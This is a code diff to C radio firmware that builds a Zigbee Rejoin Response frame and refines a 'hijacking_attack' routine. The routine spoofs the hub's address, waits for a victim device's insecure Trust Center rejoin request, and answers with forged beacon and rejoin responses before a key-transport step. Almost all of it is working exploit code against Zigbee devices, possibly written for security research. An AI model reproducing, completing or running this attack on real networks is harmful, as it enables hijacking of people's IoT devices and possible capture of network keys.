@@ -102,6 +102,9 @@ void send_zbee_cmd(uint8_t command, uint8_t security,
 		case ZBEE_NWK_CMD_REJOIN_RQ :
 			send_rejoin_request(security, dst_addr, src_addr);
 			break;
+		case ZBEE_NWK_CMD_REJOIN_RP :
+			send_rejoin_response(security, dst_addr, src_addr);
+			break;
 		case ZBEE_MAC_CMD_BEACON_RP :
 			send_beacon_response(security, dst_addr, src_addr);
 			break;
@@ -251,6 +254,51 @@ void send_rejoin_request(uint8_t security, ieee802154_addr* dst_addr, ieee802154
 	assert(count == length - 1);
 
 }
+
+void send_rejoin_response(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
+{
+	count = 0;
+	length = 37 + 2;
+	FCF = 0x8861;		
+	seqno = 0xff;
+
+	uint16_t NWK_FCF = 0x1809;
+	uint8_t radius = 0x01;
+	uint8_t nwk_seq = 0xff;
+	uint8_t status = 0x00;
+
+	cmd = 0x07;
+
+	count += spi_send_blocks(&length, sizeof(length));
+
+	// MAC Layer
+	count += spi_send_blocks(&FCF, sizeof(FCF));
+	count += spi_send_blocks(&seqno, sizeof(seqno));
+	count += spi_send_blocks(&dst_addr->pan, sizeof(dst_addr->pan));
+	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
+	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));
+
+	// NWK Layer
+	count += spi_send_blocks(&NWK_FCF, sizeof(NWK_FCF));
+	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
+	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));
+	count += spi_send_blocks(&radius, sizeof(radius));
+	count += spi_send_blocks(&nwk_seq, sizeof(nwk_seq));
+	count += spi_send_blocks(&dst_addr->long_addr, sizeof(dst_addr->long_addr));
+	count += spi_send_blocks(&src_addr->long_addr, sizeof(src_addr->long_addr));
+
+	// NWK Payload
+	count += spi_send_blocks(&cmd, sizeof(cmd));
+	// TODO: Here we can replace the 16-bit address to assign a new address.
+	// By default, we let assigned new address equal to ZED's previous addr
+	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
+	count += spi_send_blocks(&status, sizeof(status));
+
+	assert(count == length - 1);
+
+}
+
+
 /********  END of Command Library *******/
 
 /********  Attack-Specific Functions *******/
@@ -267,7 +315,6 @@ uint8_t offline_attack(ieee802154_addr* hub_addr, ieee802154_addr* victim_addr, 
 uint8_t hijacking_attack(ieee802154_addr* hub_addr, ieee802154_addr* victim_addr, uint64_t random_addr)
 {
 	ieee802154_addr fake_hub_addr = *hub_addr;
-	fake_hub_addr.pan = 0x7051;
 	fake_hub_addr.short_addr = hub_addr->short_addr + 0x0001;
 	rx_aack_config aack_config = {};
 	aack_config.aack_flag = 0;
@@ -277,12 +324,6 @@ uint8_t hijacking_attack(ieee802154_addr* hub_addr, ieee802154_addr* victim_addr
 	aack_config.target_pan_id.addr = fake_hub_addr.pan;
 	// Detect TC rejoin request and Data Request, and turn on AACK
 	
-	beacon_request_flag = 0;
-	while(!beacon_request_flag)
-	{
-		_delay_us(50);
-	}
-	send_zbee_cmd(ZBEE_MAC_CMD_BEACON_RP, 0,victim_addr, &fake_hub_addr, &aack_config);
 	tc_rejoin_request_flag = 0;
 	while(!tc_rejoin_request_flag)
 	{
@@ -293,15 +334,18 @@ uint8_t hijacking_attack(ieee802154_addr* hub_addr, ieee802154_addr* victim_addr
 			_delay_us(5);
 		}
 		send_zbee_cmd(ZBEE_MAC_CMD_BEACON_RP, 0,victim_addr, &fake_hub_addr, &aack_config);
-		// Wait for TC Rejoin Request
-		_delay_us(5);
+		// Wait for TC Rejoin Request. This delay is IMPORTANT.
+		_delay_us(5000);
 	}
+	// We have detected an insecure Rejoin Request!
+	led(1);
 	aack_config.aack_flag = 1;
+	send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RP, 0, victim_addr, &fake_hub_addr, &aack_config);
 	// 4. Detect Data Request and Send Rejoin Response Command.
 	data_request_flag = 0;
 	while(!data_request_flag)
 	{
-		_delay_us(50);
+		_delay_us(5);
 	}
 	send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RP, 0, victim_addr, &fake_hub_addr, &aack_config);
 	// 5. Detect Data Request and Send Transport Key Command.
